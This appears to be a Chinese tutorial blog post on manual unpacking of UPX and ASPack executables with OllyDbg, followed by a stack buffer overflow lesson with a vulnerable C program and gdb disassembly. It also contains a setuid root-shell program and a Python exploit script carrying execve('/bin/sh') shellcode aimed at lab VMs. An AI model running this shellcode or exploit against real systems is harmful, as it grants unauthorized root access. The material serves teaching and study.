<p><span class="md-line md-end-block">一般地，打包器和解包器是配套的。除了UPX外(加参数-d，尽管无法还原到一模一样，但还是可以用IDA分析)，以防止逆向工程为目的地打包器通常都没有解包器。因此要想解包只能自立更受手动完成或者使用某些第三方制作地解包器。</span></p>
<p><span class="md-line md-end-block">手动解包，就是用调试器和反汇编器跟踪可执行文件解压缩地逻辑，并将位于内存中地解压缩后地可执行数据导出到文件的操作。</span></p>
<p><span class="md-line md-end-block">每种打包器的压缩算法不同，若解包器本身还附带反调试代码就会让分析变得更加困难。</span></p>
<h5 class="md-end-block md-heading">通过手动解包UPX来理解工作原理</h5>
<p><span class="md-line md-end-block">下载<span class=""><a spellcheck="false" href="http://www.openrce.org/downloads/details/108/OllyDump">OllyDump</a></span>，并放于OD的插件目录下。。</span></p>
<p><span class="md-line md-end-block">用OllyICE打开upxpack.exe。开头的pushad指令的功能，是将所有寄存器的值撤退(复制)到栈。</span><span class="md-line md-end-block">继续按F8跟进，按了一会，程序再这个地方进入了循环。</span></p>
<p><img class="alignnone size-full wp-image-99864 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489050195631.png" alt=".1489050195631" width="699" height="403" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489050195631.png 699w, http://www.mottoin.com/wp-content/uploads/2017/04/1489050195631-300x173.png 300w" sizes="(max-width: 699px) 100vw, 699px" /></p>
<blockquote><p><span class="md-line md-end-block">该段的逻辑是，esi的地址向edi的地址复制数据。从复制的目标，即edi的地址可以看出，是从00401000开始逐字节进行复制。</span></p></blockquote>
<p><span class="md-line md-end-block">按F8继续运行，但为了省时，直接再下面代码中找到popad指令，然后再这里设置一个断点，并按F9运行到断点的位置。<img class="alignnone size-full wp-image-99865 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489052201829.png" alt=".1489052201829" width="702" height="353" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489052201829.png 702w, http://www.mottoin.com/wp-content/uploads/2017/04/1489052201829-300x151.png 300w" sizes="(max-width: 702px) 100vw, 702px" /></span></p>
<p><span class="md-line md-end-block">在popad下面不远处的<span spellcheck="false"><code>00407B74</code></span>有一个jmp指令，按F8单步运行到jmp指令的地方，会跳转到<span spellcheck="false"><code>00401341</code></span>处的一条call指令上。</span></p>
<p><span class="md-line md-end-block">在<span spellcheck="false"><code>004013141</code></span>处，打开OllyDump，Dump debugged process。</span></p>
<p><img class="alignnone size-full wp-image-99867 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489053134668-1.png" alt=".1489053134668" width="1299" height="679" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489053134668-1.png 1299w, http://www.mottoin.com/wp-content/uploads/2017/04/1489053134668-1-300x157.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489053134668-1-768x401.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489053134668-1-1024x535.png 1024w" sizes="(max-width: 1299px) 100vw, 1299px" /></p>
<p><span class="md-line md-end-block">这样就完成解包，打开解包后的程序，观察<span spellcheck="false"><code>00401000</code></span>处之后的反汇编代码，和原程序的一样。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>将打包器添加的用于解压缩的那部分代码在OllyDbg上运行，然后将解压缩到内存中的可执行数据用OllyDump转储到文件中。其实，开头的pushad和最后的popad中间的逻辑就是用于解压缩的程序。</strong></span></span></p>
<p><span class="md-line md-end-block"><span class=""><strong>具体的就是，在运行解压缩程序之前，先将当前的寄存器状态保存到栈中，在解压缩结束之后再从栈中恢复寄存器状态。这样一来，寄存器的值就恢复到了运行解压缩程序之前的状态，便于正确运行解压缩之后的真正的程序代码。</strong></span></span></p>
<p><span class="md-line md-end-block"><span class=""><strong>总之，大部分打包器都是使用此原理，因此一定会在某个时间点完成解压缩，然后切换到真正的程序。手动解包的关键就是“找到解压缩程序结束的瞬间(位置)”</strong></span></span></p>
<h5 class="md-end-block md-heading">用硬件断点对ASPack进行解包</h5>
<p><span class="md-line md-end-block">对于<span class=""><a spellcheck="false" href="http://ch.aspack.com/">ASPack</a></span>的解包，基本方法也是找到和pushed相对应的popad.但找到对应的popad非常困难，因此需要下硬件断点。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>硬件断点和软件断点的区别：</strong></span></span></p>
<p><span class="md-line md-end-block"><span class=""><strong>软件断点的原理很简单，本质就是调试器将断点位置的指令改成0xCC(int3h)。处理器遇到<span spellcheck="false"><code>0xCC</code></span>指令，会通过操作系统将异常报告给调试器，因此，只要在指定位置写入<span spellcheck="false"><code>0xCC</code></span>，就可以在任意的时间和位置中断程序运行.</strong></span></span></p>
<p><span class="md-line md-end-block"><span class=""><strong>硬件断点,和软件断点一样，硬件断点也可以中断程序运行并向调试器发出报告，但它并非通过<span spellcheck="false"><code>0xCC</code></span>指令来实现，而是通过直接写入寄存器(DR寄存器)来实现的。此外硬件断点不仅能够在指定的位置中断程序运行，还可以实现一些复杂的中断，“例如当向指定地址写入数据时中断”“当从指定地址读取数据时中断”等。换言之，硬件断点比软件断点功能强大</strong></span>。不过，硬件断点数量有限。软件断点地设置数量是没有限制地，但硬件断点却只能设置四个(因为处理器只设计了4个硬件断点)。</span></p>
<p><span class="md-line md-end-block">在软件分析过程中，遇到<span spellcheck="false"><code>0xCC</code></span>可能会被覆盖地情况时，一般会用硬件断点。</span></p>
<p><span class="md-line md-end-block">案例分析：</span></p>
<p><span class="md-line md-end-block">用OD打开ASPack打包地可执行文件，并按下“Ctrl+G”输入<span spellcheck="false"><code>00401000</code></span>(一直往下找肯定能找到popad，但这种找很费力。可以在<span spellcheck="false"><code>00401000</code></span>处下一个硬件断点。若操作系统启用了ASLR安全机制，那么该地址有可能不是00401000，此时只能找popad)</span></p>
<p><img class="alignnone size-full wp-image-99869 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489055719970.png" alt=".1489055719970" width="1339" height="559" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489055719970.png 1339w, http://www.mottoin.com/wp-content/uploads/2017/04/1489055719970-300x125.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489055719970-768x321.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489055719970-1024x427.png 1024w" sizes="(max-width: 1339px) 100vw, 1339px" /></p>
<p><span class="md-line md-end-block">由于可执行数据没有解包，因此现在这些数据是无法进行反汇编。</span><span class="md-line md-end-block">接下来在<span spellcheck="false"><code>00401000</code></span>处设置硬件断点，右键-&gt;Breakpoint-&gt;Hardware,on execution</span></p>
<p><img class="alignnone size-full wp-image-99870 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489056152865.png" alt=".1489056152865" width="941" height="751" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489056152865.png 941w, http://www.mottoin.com/wp-content/uploads/2017/04/1489056152865-300x239.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489056152865-768x613.png 768w" sizes="(max-width: 941px) 100vw, 941px" /></p>
<p><span class="md-line md-end-block">接下来，按F9运行程序，然后程序会在00401000处中断运行。此时，可执行数据已经解包，画面未出现反汇编代码，这时候按下Ctrl+A，OllyDbg会重新分析程序代码。</span></p>
<p><img class="alignnone size-full wp-image-99871 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489074601086.png" alt=".1489074601086" width="1483" height="701" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489074601086.png 1483w, http://www.mottoin.com/wp-content/uploads/2017/04/1489074601086-300x142.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489074601086-768x363.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489074601086-1024x484.png 1024w" sizes="(max-width: 1483px) 100vw, 1483px" /></p>
<p><span class="md-line md-end-block">后面的操作就跟UPX完全一样，使用OllyDump将文件导出，解包工作就完成。</span></p>
<blockquote><p><span class="md-line md-end-block">当然，在这个工作中，走了不少弯路，手贱地将硬件断点下在dll里面，后面调试跳不出dll，问了同学在找到问题所在。在查看-&gt;断点中，删除了dll地断点，进入程序调试界面，开始脱壳。也可使用ESP定律。</span></p></blockquote>
<p><span class="md-line md-end-block">无论什么软件，其本质都是处理器可以解释并指定地机器语言指令，因此“即便采取了难度再高地对策，只要能够读出组成软件地所有机器语言指令，就一定能找到破解地方法”</span></p>
<h2 class="md-end-block md-heading">利用软件漏洞进行攻击</h2>
<p><span class="md-line md-end-block">靶机：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="http://07c00.com/tmp/Ubuntu-12.04_binbook.zip">Ubuntu-12.04</a></span>:</span>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">用户名:root 密码:root</span></li>
<li><span class="md-line md-end-block">用户名:guest 密码:guest</span></li>
</ul>
</li>
<li><span class="md-line md-end-block"><span class=""><a spellcheck="false" href="http://07c00.com/tmp/FreeBSD_8.3_binbook.zip">FreeBSD-8.3</a></span></span>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">用户名:root 密码:root</span></li>
<li><span class="md-line md-end-block">用户名:guest 密码:guest</span></li>
</ul>
</li>
</ul>
<h3 class="md-end-block md-heading">利用缓冲区漏洞溢出执行任意代码</h3>
<h4 class="md-end-block md-heading">引发缓冲区溢出示例</h4>
<p><span class="md-line md-end-block">缓冲区溢出：输入的数据超出了程序规定地内存范围，数据溢出导致程序发生异常</span></p>
<p><span class="md-line md-end-block">例子：</span></p>
<pre>#include &lt;string.h&gt;

int main(int argc, char *argv[])
{
 char buff[64];
 strcpy(buff, argv[1]);
 return 0;
}</pre>
<p><img class="alignnone size-full wp-image-99872 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489113763977.png" alt=".1489113763977" width="710" height="391" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489113763977.png 710w, http://www.mottoin.com/wp-content/uploads/2017/04/1489113763977-300x165.png 300w" sizes="(max-width: 710px) 100vw, 710px" /></p>
<blockquote><p><span class="md-line md-end-block">该程序具有缓冲区溢出功能。这个程序为buff数组分配一块64字节地内存空间，但传递地参数argv[1]是由用户任意输入，因此参数长度很有可能超过64字节。</span><span class="md-line md-end-block">strcpy用于复制字符串，一直复制字符串到字符串地边界，即遇到&#8221;\0&#8243;为止。当用户故意向程序传递一个超过64字节地字符串时，就会在main函数中引发缓冲区溢出。</span></p></blockquote>
<h4 class="md-end-block md-heading">让普通用户用管理员权限运行程序</h4>
<p><span class="md-line md-end-block">Linux和FreeBSD中有一个用来修改密码的命令“passwd”。密码一般保存在<span spellcheck="false"><code>/etc/master.passwd</code></span>、<span spellcheck="false"><code>/etc/passwd</code></span>、<span spellcheck="false"><code>etc/shadow</code></span>等中，没有root权限无法修改这些文件。</span></p>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>setuid</code></span>的功能是让用户使用程序的所有者权限来运行程序。</span></p>
<pre>$ ls -l /etc/passwd
-rw-r--r-- 1 root wheel 1438 Apr 29 2013 /etc/passwd
$ ls -l /usr/bin/passwd
-r-sr-xr-x 2 root wheel 6360 Apr 10 2012 /usr/bin/passwd</pre>
<blockquote><p><span class="md-line md-end-block"><span spellcheck="false"><code>/etc/passwd</code></span>文件不允许除root以外的用户进行写入，但passwd命令可以(通过setuid机制)临时root全新啊运行。</span></p></blockquote>
<blockquote><p><span class="md-line md-end-block">“r-s”中的s表示该程序已启用setuid</span></p></blockquote>
<div class="CodeMirror cm-s-inner CodeMirror-wrap">
<pre>#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int main(int argc, char *argv[])
{
 char *data[2];
 char *exe = "/bin/sh";

 data[0] = exe;
 data[1] = NULL;

 setuid(0);
 execve(data[0], data, NULL);
 return 0;
}</pre>
</div>
<blockquote><p><span class="md-line md-end-block">调用execve函数运行/bin/sh</span></p></blockquote>
<p><span class="md-line md-end-block">root权限编译该程序，然后设置setuid。<span spellcheck="false"><code>ls -l</code></span>查看权限，已经启用了setuid</span></p>
<p><img class="alignnone size-full wp-image-99873 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489114760927.png" alt=".1489114760927" width="736" height="219" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489114760927.png 736w, http://www.mottoin.com/wp-content/uploads/2017/04/1489114760927-300x89.png 300w" sizes="(max-width: 736px) 100vw, 736px" /></p>
<p>&nbsp;</p>
<p><span class="md-line md-end-block">当再次以普通用户权限运行这个程序时，会用root权限调用execve函数，普通用户就会以root权限启动<span spellcheck="false"><code>/bin/sh</code></span>。当运行所编译的程序之后，普通用户权限就变成root了。</span></p>
<p><img class="alignnone size-full wp-image-99874 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489115526769.png" alt=".1489115526769" width="673" height="218" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489115526769.png 673w, http://www.mottoin.com/wp-content/uploads/2017/04/1489115526769-300x97.png 300w" sizes="(max-width: 673px) 100vw, 673px" /></p>
<h4 class="md-end-block md-heading">权限如何被夺取</h4>
<div class="CodeMirror cm-s-inner CodeMirror-wrap">
<pre> #include &lt;stdio.h&gt;
#include &lt;string.h&gt;

unsigned long get_sp(void)
{
 __asm__("movl %esp, %eax");
}

int cpy(char *str)
{
 char buff[64];
 printf("0x%08lx", get_sp() + 0x10);
 getchar();
 strcpy(buff, str);
 return 0;
}

int main(int argc, char *argv[])
{
 cpy(argv[1]);
 return 0;
}</pre>
</div>
<pre>#!/usr/local/bin/python
import sys
from struct import *

if len(sys.argv) != 2:
 addr = 0x41414141
else:
 addr = int(sys.argv[1], 16)

s = ""
s += "\x31\xc0\x50\x89\xe0\x83\xe8\x10" # 8
s += "\x50\x89\xe3\x31\xc0\x50\x68\x2f" #16
s += "\x2f\x73\x68\x68\x2f\x62\x69\x6e" #24
s += "\x89\xe2\x31\xc0\x50\x53\x52\x50" #32
s += "\xb0\x3b\xcd\x80\x90\x90\x90\x90" #40
s += "\x90\x90\x90\x90\x90\x90\x90\x90" #48
s += "\x90\x90\x90\x90\x90\x90\x90\x90" #56
s += "\x90\x90\x90\x90\x90\x90\x90\x90" #64
s += "\x90\x90\x90\x90"+pack('&lt;L',addr) #72

sys.stdout.write(s)</pre>
<p><span class="md-line md-end-block">运行两个程序</span></p>
<p><img class="alignnone size-full wp-image-99875 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489116069190.png" alt=".1489116069190" width="606" height="322" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489116069190.png 606w, http://www.mottoin.com/wp-content/uploads/2017/04/1489116069190-300x159.png 300w" sizes="(max-width: 606px) 100vw, 606px" /></p>
<p><span class="md-line md-end-block">sample3.c的cpy函数会将输入的字符串原原本本得复制到一块只有64字节得内存空间中。由于字符串是由用户任意输入得，因此exploit.py 的输出结果输入给sample3.c，就能成功地以所有者权限运行<span spellcheck="false"><code>/bin/sh</code></span></span></p>
<h4 class="md-end-block md-heading">栈使用运行空间</h4>
<p><span class="md-line md-end-block">栈是一种内存的使用方式，栈并不是一种物理上真实存在的东西，它是普通的内存空间。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>向栈存入数据</strong></span></span></p>
<p><img class="alignnone size-full wp-image-99876 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489119852167.png" alt=".1489119852167" width="1121" height="251" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489119852167.png 1121w, http://www.mottoin.com/wp-content/uploads/2017/04/1489119852167-300x67.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489119852167-768x172.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489119852167-1024x229.png 1024w" sizes="(max-width: 1121px) 100vw, 1121px" /></p>
<p>在程序开始运行时，先要确定栈的起点(基地址)。假设栈的起点为bffff6fc(ebp=esp)，bffff6fc已经存在0x01。</p>
<p><img class="alignnone size-full wp-image-99877 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489119988554.png" alt=".1489119988554" width="1165" height="383" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489119988554.png 1165w, http://www.mottoin.com/wp-content/uploads/2017/04/1489119988554-300x99.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489119988554-768x252.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489119988554-1024x337.png 1024w" sizes="(max-width: 1165px) 100vw, 1165px" /></p>
<p>bffff6fc的值为0x01，执行push命令，push 0x02。最早的地址中还是不变为0x01,0x02保存到相邻的地址中。</p>
<p><img class="alignnone size-full wp-image-99878 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489120781647.png" alt=".1489120781647" width="1212" height="443" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489120781647.png 1212w, http://www.mottoin.com/wp-content/uploads/2017/04/1489120781647-300x110.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489120781647-768x281.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489120781647-1024x374.png 1024w" sizes="(max-width: 1212px) 100vw, 1212px" /></p>
<p>栈是从后往前(向地址递减的方向)增长的。若不断执行push指令，push的值就会不断被存入更靠前的内存地址中。esp寄存器中则保存了最新入栈的内存地址。</p>
<p><img class="alignnone size-full wp-image-99879 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489120928505.png" alt=".1489120928505" width="1219" height="380" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489120928505.png 1219w, http://www.mottoin.com/wp-content/uploads/2017/04/1489120928505-300x94.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489120928505-768x239.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489120928505-1024x319.png 1024w" sizes="(max-width: 1219px) 100vw, 1219px" /></p>
<blockquote><p><span class="md-line md-end-block">将0x02~0x05的值按顺序push时栈的状态。</span></p></blockquote>
<p><span class="md-line md-end-block"><span class=""><strong>从栈中取出数据</strong></span></span></p>
<p><span class="md-line md-end-block md-focus"><span class="md-expand">从栈中取出数据时，使用pop指令，pop指令会从栈的最低位地址取出一条数据。</span></span><span class="md-line md-end-block"><span class="">栈的最低位地址叫做这个栈的“栈顶”(esp)</span></span></p>
<p><img class="alignnone size-full wp-image-99880 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489121561708.png" alt=".1489121561708" width="1218" height="430" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489121561708.png 1218w, http://www.mottoin.com/wp-content/uploads/2017/04/1489121561708-300x106.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489121561708-768x271.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489121561708-1024x362.png 1024w" sizes="(max-width: 1218px) 100vw, 1218px" /></p>
<p><span class="md-line md-end-block md-focus"><span class="md-expand">执行pop eax</span></span><span class="md-line md-end-block">最后push的数据为0x05，这条数据会被首先pop出来，因此，eax里面会被存入0x05，这条数据会被首先pop出来。因此，eax里面会被存入0x05。</span></p>
<p><img class="alignnone size-full wp-image-99881 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489121628523.png" alt=".1489121628523" width="1228" height="475" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489121628523.png 1228w, http://www.mottoin.com/wp-content/uploads/2017/04/1489121628523-300x116.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489121628523-768x297.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489121628523-1024x396.png 1024w" sizes="(max-width: 1228px) 100vw, 1228px" /></p>
<p><span class="md-line md-end-block md-focus"><span class="md-expand">再执行一次pop，就取出了0x04。</span></span><span class="md-line md-end-block">这时，esp的值也会发生变化，先从<span spellcheck="false"><code>bffff6ec</code></span>变成bffff6f0，然后再变成bffff6f4。</span></p>
<blockquote><p><span class="md-line md-end-block">栈，是LIFO(Last In,First Out)，即后进先出。队列是先进先出(FIFO)。</span></p></blockquote>
<h4 class="md-end-block md-heading">执行任意代码</h4>
<pre>void func(int x, int y, int z)
{
 int a;
 char buff[8];
}

int main(void)
{
 func(1, 2, 3);
 return 0;
}</pre>
<p><img class="alignnone size-full wp-image-99882 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489129110768.png" alt=".1489129110768" width="690" height="669" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489129110768.png 690w, http://www.mottoin.com/wp-content/uploads/2017/04/1489129110768-300x291.png 300w" sizes="(max-width: 690px) 100vw, 690px" /></p>
<p><span class="md-line md-end-block">gcc加上-S选项进行编译，然后生成sample4.s文件，即sample4.c的汇编代码。<span spellcheck="false"><code>func</code></span>函数有三个参数，分别传递了1,2,3三个数字，而func函数，内部没有进行任何处理。</span></p>
<p><img class="alignnone size-full wp-image-99883 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489129503151.png" alt=".1489129503151" width="837" height="709" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489129503151.png 837w, http://www.mottoin.com/wp-content/uploads/2017/04/1489129503151-300x254.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489129503151-768x651.png 768w" sizes="(max-width: 837px) 100vw, 837px" /></p>
<p><span class="md-line md-end-block">在C语言中传递的int型参数，在汇编语言中需要在<span spellcheck="false"><code>call func</code></span>之前存放到栈中。尽管这里的入栈操作没有使用push指令，但功能是相同的。</span></p>
<p><span class="md-line md-end-block"><span class=""><strong>函数调用时入栈的方法1</strong></span></span></p>
<pre>push $3 //esp-=4，将3送入esp+0
push $2 //esp-=4，将2送入esp+0
push $1 //esp-=4，将1送入esp+0</pre>
<p><span class="md-line md-end-block"><span class=""><strong>函数调用时入栈的方法2</strong></span></span></p>
<pre> subl $12, %esp //esp-=12
 movl $3, 8(%esp) //将3送入esp+8
 movl $2, 4(%esp) //将2送入esp+4
 movl $1, (%esp) //将1送入esp+0</pre>
<p><span class="md-line md-end-block">将参数入栈后，通过call指令调用子程序</span></p>
<p><span class="md-line md-end-block">和jmp不同，call必须记住调用时当前指令的地址，因此在跳转到子程序的地址之前，需要先将返回地址(ret_addr)push到栈中。</span><span class="md-line md-end-block">当调用func函数时，在跳转到函数起始地址的瞬间，栈的情形如下图：</span></p>
<p><img class="alignnone size-full wp-image-99884 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489130168887.png" alt=".1489130168887" width="1201" height="266" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489130168887.png 1201w, http://www.mottoin.com/wp-content/uploads/2017/04/1489130168887-300x66.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489130168887-768x170.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489130168887-1024x227.png 1024w" sizes="(max-width: 1201px) 100vw, 1201px" /></p>
<p><span class="md-line md-end-block">程序执行了push ebp。接下来ebp继续递减，为函数内部的局部变量分配内存空间。</span></p>
<p><img class="alignnone size-full wp-image-99885 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/1489130235261.png" alt=".1489130235261" width="1120" height="255" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/1489130235261.png 1120w, http://www.mottoin.com/wp-content/uploads/2017/04/1489130235261-300x68.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/1489130235261-768x175.png 768w, http://www.mottoin.com/wp-content/uploads/2017/04/1489130235261-1024x233.png 1024w" sizes="(max-width: 1120px) 100vw, 1120px" /></p>
<p><span class="md-line md-end-block">此时，若数据溢出，超过了原本分配给数组buff的内存空间，数组buff后面的%ebp、ret_addr以及传递给func函数的参数都会被溢出的数据覆盖。一旦%ebp和ret_addr被覆盖掉，<span spellcheck="false"><code>ret_addr</code></span>存放的是函数逻辑结束后返回main函数的目标地址。也就是说，若覆盖了ret_addr，攻击者就可以让程序跳转到任意地址。若攻击者事先准备好一段代码，然后让程序跳转到这段代码，也就相当于成功攻击了“可执行任意代码的漏洞”。</span></p>
<h4 class="md-end-block md-heading">使用gdb查看程序运行情况</h4>
<p><span class="md-line md-end-block">gdb是Unix系统中常用的调试器。</span></p>
<p><img class="alignnone size-full wp-image-99886 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/04/14914456821.png" alt="1491445682(1)" width="1000" height="518" data-srcset="http://www.mottoin.com/wp-content/uploads/2017/04/14914456821.png 1000w, http://www.mottoin.com/wp-content/uploads/2017/04/14914456821-300x155.png 300w, http://www.mottoin.com/wp-content/uploads/2017/04/14914456821-768x398.png 768w" sizes="(max-width: 1000px) 100vw, 1000px" /></p>
<p><span class="md-line md-end-block">使用gdb对程序进行调试有两种方法：</span></p>
<ul class="ul-list" data-mark="*">
<li><span class="md-line md-end-block">将程序的路径作为参数传递给gdb。如<span spellcheck="false"><code>gdb test00</code></span></span></li>
<li><span class="md-line md-end-block">将gdb挂载到某个进程上.如<span spellcheck="false"><code>gdb attach 1111</code></span></span></li>
</ul>
<pre>$ gdb sample3
GNU gdb 6.1.1 [FreeBSD]
Copyright 2004 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB. Type "show warranty" for details.
This GDB was configured as "i386-marcel-freebsd"...(no debugging symbols found)...
(gdb) disas cpy
Dump of assembler code for function cpy:
0x08048540 &lt;cpy+0&gt;: push %ebp
0x08048541 &lt;cpy+1&gt;: mov %esp,%ebp
0x08048543 &lt;cpy+3&gt;: sub $0x48,%esp
0x08048546 &lt;cpy+6&gt;: call 0x8048530 &lt;get_sp&gt;
0x0804854b &lt;cpy+11&gt;: add $0x10,%eax
0x0804854e &lt;cpy+14&gt;: mov %eax,0x4(%esp)
0x08048552 &lt;cpy+18&gt;: movl $0x8048681,(%esp)
0x08048559 &lt;cpy+25&gt;: call 0x80483ac &lt;_init+52&gt;
0x0804855e &lt;cpy+30&gt;: mov 0x8049840,%eax
0x08048563 &lt;cpy+35&gt;: test %eax,%eax
0x08048565 &lt;cpy+37&gt;: jne 0x8048599 &lt;cpy+89&gt;
0x08048567 &lt;cpy+39&gt;: mov 0x8049844,%eax
0x0804856c &lt;cpy+44&gt;: mov 0x4(%eax),%edx
0x0804856f &lt;cpy+47&gt;: sub $0x1,%edx
0x08048572 &lt;cpy+50&gt;: mov %edx,0x4(%eax)
0x08048575 &lt;cpy+53&gt;: mov 0x4(%eax),%eax
0x08048578 &lt;cpy+56&gt;: test %eax,%eax
0x0804857a &lt;cpy+58&gt;: jns 0x804858b &lt;cpy+75&gt;
0x0804857c &lt;cpy+60&gt;: mov 0x8049844,%eax
0x08048581 &lt;cpy+65&gt;: mov %eax,(%esp)
0x08048584 &lt;cpy+68&gt;: call 0x80483cc &lt;_init+84&gt;
0x08048589 &lt;cpy+73&gt;: jmp 0x80485a6 &lt;cpy+102&gt;
0x0804858b &lt;cpy+75&gt;: mov 0x8049844,%eax
0x08048590 &lt;cpy+80&gt;: mov (%eax),%edx
0x08048592 &lt;cpy+82&gt;: add $0x1,%edx
0x08048595 &lt;cpy+85&gt;: mov %edx,(%eax)
0x08048597 &lt;cpy+87&gt;: jmp 0x80485a6 &lt;cpy+102&gt;
0x08048599 &lt;cpy+89&gt;: mov 0x8049844,%eax
0x0804859e &lt;cpy+94&gt;: mov %eax,(%esp)
0x080485a1 &lt;cpy+97&gt;: call 0x80483fc &lt;_init+132&gt;
0x080485a6 &lt;cpy+102&gt;: mov 0x8(%ebp),%eax
0x080485a9 &lt;cpy+105&gt;: mov %eax,0x4(%esp)
0x080485ad &lt;cpy+109&gt;: lea 0xffffffc0(%ebp),%eax
0x080485b0 &lt;cpy+112&gt;: mov %eax,(%esp)
0x080485b3 &lt;cpy+115&gt;: call 0x80483ec &lt;_init+116&gt;
0x080485b8 &lt;cpy+120&gt;: mov $0x0,%eax
0x080485bd &lt;cpy+125&gt;: leave 
0x080485be &lt;cpy+126&gt;: ret 
0x080485bf &lt;cpy+127&gt;: nop 
End of assembler dump.
